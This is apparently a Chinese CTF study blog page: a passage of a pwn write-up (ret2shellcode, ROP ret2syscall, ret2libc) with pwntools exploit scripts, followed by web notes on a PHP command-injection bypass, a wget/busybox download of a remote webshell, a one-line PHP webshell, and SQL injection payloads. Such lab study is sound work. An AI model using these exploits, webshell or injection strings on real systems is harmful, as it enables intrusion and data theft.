<p>换用gdb-peda插件，<code>pattern create 150</code>，生成150个字符，复制输入，<code>c</code>运行报错（提前下断点<code>b main</code>）。</p>
<p><img src="/../images/basic-pwn.assets/image-20231115023744926.png" alt="image-20231115023744926"></p>
<p><img src="/../images/basic-pwn.assets/image-20231115023800150.png" alt="image-20231115023800150"></p>
<p>可以看出，ebp被覆盖掉了，覆盖内容为<code>MAAi</code>，使用命令<code>pattern offset MAAi</code>，即可计算出真实偏移量，为108。</p>
<p>调用pwn库函数的指令<code>asm(shellcraft.sh())</code>生成shellcode，查看其长度为44字节</p>
<p><img src="/../images/basic-pwn.assets/image-20231115023952729.png" alt="image-20231115023952729"></p>
<p>则我们需要填充的垃圾字符长度为<code>108-44+4=68</code>，(+4为返回地址)，所以可以构造脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc=process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#shellcode=b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#payload=shellcode+b&quot;A&quot;*89+p32(0x0804a080)</span></span><br><span class="line">payload=shellcode+<span class="string">b&quot;A&quot;</span>*<span class="number">68</span>+p32(<span class="number">0x0804a080</span>)</span><br><span class="line">proc.recvline()</span><br><span class="line">proc.sendline(payload)</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../images/basic-pwn.assets/image-20231115031232593.png" alt="image-20231115031232593"></p>
<p>很奇怪，EOF了.</p>
<p>&#x3D;&#x3D;后记&#x3D;&#x3D;：后来了解到，原因是strncpy()写入的buf2在.bss段，自从Linux内核5.x之后，内存的BSS段默认没有可执行权限，该段上的权限是&#x3D;&#x3D;rw&#x3D;&#x3D;，并不是写入了stack里（stack为rwx，有执行权限），因此返回地址跳转到.bss段中的shellcode并执行，并不会真正的拿到shell。真正getshell方法较为困难，后续再探讨</p>
<p><img src="/../images/basic-pwn.assets/image-20231116234949317.png" alt="image-20231116234949317"></p>
<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p><img src="/../images/basic-pwn.assets/image-20231117015423484.png" alt="image-20231117015423484"></p>
<p>直接<code>checksec</code>，开启了NX，IDA反汇编main函数</p>
<p><img src="/../images/basic-pwn.assets/image-20231117021653780.png" alt="image-20231117021653780"></p>
<p>同样利用ret2shellcode的方法计算出返回地址距离v4的偏移仍为108+4</p>
<p><img src="/../images/basic-pwn.assets/image-20231117024843769.png" alt="image-20231117024843769"></p>
<p>这里使用ROP技术进行攻击，ROP的全称为Return-oriented Programming（返回导向编程），这是一种高级的内存攻击技术，攻击者扫描已有的动态链接库和可执行文件，提取出可以利用的指令片段(gadget)，这些指令片段均以ret指令结尾，即用ret指令实现指令片段执行流的衔接，从而构建恶意代码。可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</p>
<p>常见的利用方法是使用系统调用获得shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>其中，该程序是 32 位，所以我们需要使得</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb，即execve()函数的系统调用号</li>
<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<p>&#x3D;&#x3D;这里待定，使用COMPILER EXPLORER编译结果使用的不是这几个寄存器&#x3D;&#x3D;<img src="/../images/basic-pwn.assets/image-20231117025655190.png" alt="image-20231117025655190"></p>
<p>补上<code>vmmap</code>情况</p>
<p><img src="/../images/basic-pwn.assets/image-20231117030324644.png" alt="image-20231117030324644"></p>
<p>首先查找汇编指令为<code>pop eax</code>，后续接<code>ret</code>的命令</p>
<p><img src="/../images/basic-pwn.assets/image-20231117030450390.png" alt="image-20231117030450390"></p>
<p>使用<code>0x080bb196</code> 的地址，值得注意的是，该部分代码段有执行权限，因为我们不需要写入权限，仅仅需要ret地址为下一条目标指令即可，顺次拼接。</p>
<p><img src="/../images/basic-pwn.assets/image-20231117032147479.png" alt="image-20231117032147479"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p>为了验证上述黄色猜想，选择这两条分别测试，其中第二条为wp选择</p>
<p>接下来寻找字符串”&#x2F;bin&#x2F;sh”所在地址</p>
<p><img src="/../images/basic-pwn.assets/image-20231117031140755.png" alt="image-20231117031140755"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>

<p>最后一条是int 0x80系统调用地址</p>
<p><img src="/../images/basic-pwn.assets/image-20231117031300711.png" alt="image-20231117031300711"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049421 : int 0x80</span><br></pre></td></tr></table></figure>

<p>将上述地址拼接起来，构成payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, bin_sh, int_0x80])</span><br><span class="line">sh.recvuntil(<span class="string">&quot;What do you plan to do?\n&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>最后测试结果，只有pop_edx_ecx_ebx_ret可以getshell，有点奇怪</p>
<p><img src="/../images/basic-pwn.assets/image-20231117032438162.png" alt="image-20231117032438162"></p>
<h3 id="ret2lib1"><a href="#ret2lib1" class="headerlink" title="ret2lib1"></a>ret2lib1</h3><p>惯例反汇编加checksec检查</p>
<p><img src="/../images/basic-pwn.assets/image-20231120194053493.png" alt="image-20231120194053493"></p>
<p><img src="/../images/basic-pwn.assets/image-20231120194107395.png" alt="image-20231120194107395"></p>
<p>其中，<code>gets()</code>函数存在栈溢出</p>
<p><img src="/../images/basic-pwn.assets/image-20231120194950730.png" alt="image-20231120194950730"></p>
<p>本题情况较好，经过IDA查找，发现即既调用有<code>system()</code>函数，又有<code>/bin/sh</code>的字符串，因此可以直接组合两段地址，构造exp</p>
<p><img src="/../images/basic-pwn.assets/image-20231120200129820.png" alt="image-20231120200129820"></p>
<p><img src="/../images/basic-pwn.assets/image-20231120200147555.png" alt="image-20231120200147555"></p>
<p><img src="/../images/basic-pwn.assets/image-20231120200214634.png" alt="image-20231120200214634"></p>
<p>本题与前面不同点在于，调用的<code>system()</code>函数，不是自己写的，而是libc中加载的函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc=process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x08048460</span></span><br><span class="line">sh_addr=<span class="number">0x08048720</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat([<span class="string">b&quot;A&quot;</span>*<span class="number">112</span>,sys_addr,<span class="string">b&quot;A&quot;</span>*<span class="number">4</span>,sh_addr])</span><br><span class="line"><span class="comment">#payload=b&quot;A&quot;*112+p32(sys_addr)+b&quot;A&quot;*4+p32(sh_addr)</span></span><br><span class="line">proc.recvline()</span><br><span class="line">proc.sendline(payload)</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure>

<p>其中，<code>sys_addr</code>后面加的<code>b&quot;A&quot;*4</code>为填位的返回地址，具体结构参见<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/27339191">链接</a>。上下两种payload均可。</p>
<p><img src="/../images/basic-pwn.assets/image-20231120201811333.png" alt="image-20231120201811333"></p>
<h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p><code>checksec()</code>和IDA发现，本题和上一题大差不差，但是没有<code>/bin/sh</code>字符串，有<code>system()</code>函数。</p>
<p><img src="/../images/basic-pwn.assets/image-20231120205835956.png" alt="image-20231120205835956"></p>
<p>查看主函数，仍然是<code>gets()</code>函数栈溢出，</p>
<p><img src="/../images/basic-pwn.assets/image-20231120210145342.png" alt="image-20231120210145342"></p>
<p>可以考虑覆盖返回地址，再次调用<code>gets()</code>函数，写入<code>/bin/sh</code>的字符串到指定位置（这里选择的是.bss段的buf2中），然后再从buf2上加载该字符串，作为<code>system()</code>函数的参数。</p>
<p>这一块儿需要构造两个ROP，其中gets()函数怎么控制返回地址写入buf2中有点迷糊。具体来说，需要构造如下图样式的链条</p>
<p><img src="/../images/basic-pwn.assets/image-20231121022558779.png" alt="image-20231121022558779"></p>
<p>gets()函数在plt中的相对地址已有，可以在IDA中查询或直接在gdb中<code>disass gets</code>，同理system()函数</p>
<p><img src="/../images/basic-pwn.assets/image-20231121022818742.png" alt="image-20231121022818742"></p>
<p>.bss段中buf2的地址为<code>0x0804A080</code></p>
<p><img src="/../images/basic-pwn.assets/image-20231121022935230.png" alt="image-20231121022935230"></p>
<p>gets的返回地址的gadget为<code>0x0804843d</code></p>
<p><img src="/../images/basic-pwn.assets/image-20231121023245997.png" alt="image-20231121023245997"></p>
<p>构造exp为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br><span class="line">proc.sendline(payload)</span><br><span class="line">proc.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">proc.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述的<code>0xdeadbeef</code>是magic number，该处返回地址无意义，填充跳过</p>
<p><img src="/../images/basic-pwn.assets/image-20231121023609785.png" alt="image-20231121023609785"></p>
<p>最后getshell。</p>
<p>&#x3D;&#x3D;补充&#x3D;&#x3D;，之前对buf2返回地址要找一个<code>pop ebx; ret</code>的gadget有点迷，后来看了一下。在gets()函数被执行之后，main()的返回地址（被替换成了gets()的地址）以及gets()的返回地址会被<code>RET</code>指令弹出，但是gets()的参数还留在栈顶，需要清除掉后再放入system()的返回地址和参数（system的地址就是gets()的返回地址）。理论上的方案是现在代码段中找到<code>POP</code>指令插入到gets()和system()之间，因此插入上述的gadget，但是实际上system()不在乎返回地址，可以直接影响就干脆直接返回system()函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, system_plt, buf2, buf2])</span><br><span class="line">proc.sendline(payload)</span><br><span class="line">proc.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure>

<p>其中，<code>system_plt</code>也作为<code>gets()</code>函数的返回地址，第一个buf2是gets()函数写入的地址，第二个buf2是system()函数的参数，很精妙，也能getshell。</p>
<h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p>与前两个差不多，但是该题将system()函数调用也隐去</p>

    

    

    

  </div>
  <div class="article-info article-info-index">
    
    
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-pwn</a>
        		</li>
      		
		</ul>
	</div>

    

    
    <p class="article-more-link">
      <a class="article-more-a" href="/2023/11/15/basic-pwn/">展开全文 >></a>
    </p>
    

    
    <div class="clearfix"></div>
  </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-CTF-web-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
  
  
    <h1 itemprop="name">
	
	  <a class="article-title" href="/2021/03/07/CTF-web-1/" target="_blank">CTF-web-1</a>
  
    </h1>
  


  
  
<a href="/2021/03/07/CTF-web-1/" class="archive-article-date">
        <time datetime="2021-03-06T16:50:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-07</time>
</a>

  
  
    

  
  </header>
  
  <div class="article-entry" itemprop="articleBody">
    
    <center>CTF-web学习篇</center>

<blockquote>
<p>本文设计CTF-web的许多知识，以题目的角度分析学习，个人笔记，会长期更新！</p>
<p>呜呜呜，网安本是逆天而行，中途猝死很正常(T ^ T) </p>
</blockquote>
<h2 id="一、PHP代码审计绕过"><a href="#一、PHP代码审计绕过" class="headerlink" title="一、PHP代码审计绕过"></a>一、PHP代码审计绕过</h2><p>其<code>index.php</code>页面有如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">#文本高亮显示</span></span><br><span class="line">	<span class="comment">#分块来审计代码</span></span><br><span class="line">	<span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="comment">#在目录sandbox下，新建一个以ip地址命名的目录，其中&quot;.&quot;是php语言中的&quot;+&quot;，拼接字符串。$_SERVER是全局变量，会获得客户端的ip地址</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))<span class="comment">#判断目录是否存在，不存在就新建一个，存在就切换至dir目录</span></span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];<span class="comment">#接收GET方式传入的一个args（数组）参数</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$args</span>);<span class="variable">$i</span>++)&#123;<span class="comment">#从count也能发现其为数组，因为变量无法通过该方式进行遍历</span></span><br><span class="line">    	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\w+$/&#x27;</span>,<span class="variable">$args</span>[<span class="variable">$i</span>]))<span class="comment">#使用正则匹配对数组中的每一项进行遍历，其中该正则表示开头和结尾都是以字母数字下划线组成的一次或多次的字符。说明接下来要绕过这个过滤。</span></span><br><span class="line">        	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">	<span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/true&quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot; &quot;</span>,<span class="variable">$args</span>));<span class="comment">#将.连接的args中的字符串使用空格分割，并作为命令执行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后一行示例：</p>
<p><code>args=[1,2,3] =&gt; /bin/true 1 2 3</code></p>
<p>综上，思路为通过构造数组绕过正则匹配形成可识别命令执行，空格符合执行多条命令的条件，这里考虑上传webshell来执行相关命令。可以考虑<code>wget</code>方式。</p>
<ol>
<li>遍历部分命令如<code>&amp;&amp; || ; \n</code>发现该正则匹配对<code>\n</code>不进行匹配而跳过直接执行以下内容如\n123</li>
</ol>
<p><code>/bin/true</code></p>
<p><code>1 2 3</code></p>
<p>会变为两条命令，但是命令要执行需要分隔否则系统无法识别，故<strong>将\n进行url编码为%0a也会绕过正则匹配</strong></p>
<p>如访问<code>http://ip/?args[]=a%0A&amp;args[]=touch$args[]=abc</code>，相当于执行了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/true a</span><br><span class="line">touch abc</span><br></pre></td></tr></table></figure>

<p>也即建立了一个abc的文件，在服务器的<code>/var/www</code>文件下新建<code>abc</code>文件夹.</p>
<p>使用wget命令远程下载webshell，或者busybox等。但都会出现ip地址如<code>127.0.0.1</code>，但这种形式无法绕过正则匹配，因此有了如下思路</p>
<p>ip地址的意义为一列二进制的数字，每八位分成一个十进制的数字表示所以每个.的范围在0到255。因此我们可以</p>
<p><strong>使用ip地址的十进制格式绕过匹配！</strong></p>
<p>又出现一个问题，webshell文件一般为<code>.php</code>后缀，但显然无法绕过正则匹配，所以也要想办法绕过。</p>
<p><strong>在shell中，如果有一个abc.php文件，我们可以直接使用如下命令来运行</strong></p>
<p><code>php abc</code>如此便可绕过后缀。</p>
<p>如下命令即可完成操作，但需要注意，最好在新建文件夹后进入该文件夹执行wget和php运行，因为<code>/var/www</code>文件夹会有所权限限制，所以在新文件夹中能更好跟稳妥的进行操作。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?args[]=a%0a&amp;args[]=mkdir&amp;args[]=abc%0a&amp;args[]=cd&amp;args[]=abc%0a&amp;args[]=wget&amp;args[]=十进制IP%0a</span></span><br></pre></td></tr></table></figure>

<p>结尾处的<code>%0a</code>不可少。能否直接下载php文件，则要看给的权限设置，如果不行，按照如下方法</p>
<p>可以压缩成<code>.tar</code>的压缩包而不带后缀如<code>aa</code>，但之后还需要解压缩。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?args[0]=x%0a</span><br><span class="line">&amp;args[1]=tar</span><br><span class="line">&amp;args[2]=cvf</span><br><span class="line">&amp;args[3]=aa</span><br><span class="line">&amp;args[4]=abc%0a#解压路径</span><br><span class="line">&amp;args[5]=php</span><br><span class="line">&amp;args[6]=aa</span><br></pre></td></tr></table></figure>

<p>如下给出busybox和shell代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?args[]=x%0a&amp;args[]=busybox&amp;args[]=ftpget&amp;args[]=&lt;IP_IN_DECIMAL&gt;&amp;args[]=script</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;</span></span><br><span class="line"><span class="string">	&lt;?php</span></span><br><span class="line"><span class="string">	header(&quot;Content-Type: text/plain&quot;);</span></span><br><span class="line"><span class="string">	print shell_exec($_GET[&quot;cmd&quot;]);</span></span><br><span class="line"><span class="string">	?&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>里面的内容为在当前文件夹生成一个<code>shell.php</code>的文件，一句话马</p>
<p>可以使用<code>http://127.0.0.1/shell.php?cmd=cat /flag.txt</code>来查找flag</p>
<h2 id="二、SQL注入的原理与利用"><a href="#二、SQL注入的原理与利用" class="headerlink" title="二、SQL注入的原理与利用"></a>二、SQL注入的原理与利用</h2><blockquote>
<p>本质就是用户的输入会拼接到查询语句中，字符拼接</p>
</blockquote>
<p>在经典的用户身份认证端会有</p>
<p>用户输入：用户名和密码</p>
<p>SQL拼接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where username=&#x27;用户名&#x27; and password = &#x27;用户提交&#x27;</span><br></pre></td></tr></table></figure>

<p>当用户在用户名处输入<code>admin&#39; or 1#</code>，或者在密码处输入<code>xxx&#39;or &#39;1&#39;=&#39;1</code></p>
<p>SQL会拼接成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where username=&#x27;admin&#x27; or 1#&#x27; and password = &#x27;xxx&#x27;</span><br><span class="line">#或者</span><br><span class="line">select * from admin where username=&#x27;admin&#x27; and password = &#x27;xxx&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>

<p>以上两组判断真值都为<strong>true</strong>，故mysql会执行查询爆出所有数据</p>
<p>一般来说，前端会有过滤用户输入的过程</p>
<p>可以在burpsuite测试，bp中的Repeater模块中空格使用**”+”<strong>或者</strong>“%20”**代替</p>
<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from articles where id = 1</span><br><span class="line">select * from articles where id = (1)</span><br></pre></td></tr></table></figure>

<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from articles where id = &quot;1&quot;</span><br><span class="line">select * from articles where id = &#x27;1&#x27;</span><br><span class="line">select * from articles where id = (&#x27;1&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入可能存在的位置"><a href="#SQL注入可能存在的位置" class="headerlink" title="SQL注入可能存在的位置"></a>SQL注入可能存在的位置</h3><ol>
<li>URL提交的参数</li>
<li>HTTP请求主体（POST提交的数据）</li>
<li>HTTP请求头（User-Agent、Referer、Cookie等）</li>
</ol>
<p><strong>SQL注入的核心是逃逸引号</strong>，只有逃出来才能输入需要的命令</p>
<h3 id="SQL注入利用方式"><a href="#SQL注入利用方式" class="headerlink" title="SQL注入利用方式"></a>SQL注入利用方式</h3><ol>
<li>获取数据库信息（脱裤）</li>
<li>获取系统命令执行shell</li>
<li>上传、下载服务器文件（webshell）</li>
</ol>
<p>对sql注入的利用技术主要分以下四类</p>
<ol>
<li>联合注入</li>
<li>布尔注入</li>
<li>延时盲注</li>
<li>报错注入</li>
</ol>
<p>在后面题目中会详细介绍这四种的具体利用（非sqlmap方式。。。）</p>
<h2 id="三、SQL注入-Union联合注入"><a href="#三、SQL注入-Union联合注入" class="headerlink" title="三、SQL注入-Union联合注入"></a>三、SQL注入-Union联合注入</h2><p><strong>条件：输入有返回查询</strong></p>
<p><code>select * from person where id = 1;</code>#<strong>在person表中，筛选出id &#x3D; 1的记录</strong></p>
<p>如果id&#x3D;1中的1是用户可以控制的输入部分，就会存在sql注入，小tips：mysql会记录缓存，如果缓存查找过，则会直接输出，不用再次查找</p>
<p><strong>union</strong>的作用是联合两个select语句，注意，前后字段数必须保持一致，如</p>
<p><code>select * from person where id =1;</code>执行后结果</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>age</th>
<th>phone</th>
<th>email</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>admin</td>
<td>xx</td>
<td>xx</td>
<td>xx</td>
</tr>
</tbody></table>
<p>则拼接的union语句需要为</p>
<p><code>select * from person where id = 1 union select  1,2,3,4,5</code>#不能多也不能少</p>
<p>输出结果会将12345插入</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>age</th>
<th>phone</th>
<th>email</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>admin</td>
<td>xx</td>
<td>xx</td>
<td>xx</td>
</tr>
<tr>
<td>1</td>
<td>2</td>
<td>3</td>
<td>4</td>
<td>5</td>
</tr>
</tbody></table>
<p>而此时我们可以将12345任意一个换成其他<strong>数据库、表之类的</strong></p>
<p>eg：<code>select * from person where id = 1 union select 1,2,database(),4,5</code>#则会将数据库名显示在第三列</p>
<p>其中难点在于：<strong>我们一般不知道字段数！</strong>，这里就需要我们首先找出字段数</p>
<p>使用<code>order by num</code>。当依次增大num时候，如果出现错误，那么上一条sql查询的num值就是对应的字段数</p>
<p>eg：</p>
<p><code>select * from person where id = 1 order by 1;</code></p>
<p><code>select * from person where id = 1 order by 2;</code></p>
<p><code>select * from person where id = 1 order by 3;</code>#若3报错则说明字段数为2</p>
<p>之后再使用</p>
<p><code>select * from person where id = 1 union select 1,2,database(),version(),user()</code>#后面爆出的分别是数据库，版本号和用户名（一般以<a href="mailto:&#114;&#x6f;&#111;&#x74;&#x40;&#120;&#120;&#x78;&#46;&#x78;&#120;&#120;&#x2e;&#120;&#120;&#120;&#x2e;&#x78;&#x78;&#120;">&#114;&#x6f;&#111;&#x74;&#x40;&#120;&#120;&#x78;&#46;&#x78;&#120;&#120;&#x2e;&#120;&#120;&#120;&#x2e;&#x78;&#x78;&#120;</a>显示）</p>
<p><strong>查询数据表</strong>：mysql5.0以后的版本提供了一个函数<code>information_schema.tables</code>来查询，如</p>
<p><code>select * from person where id = 1 union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4,5</code></p>
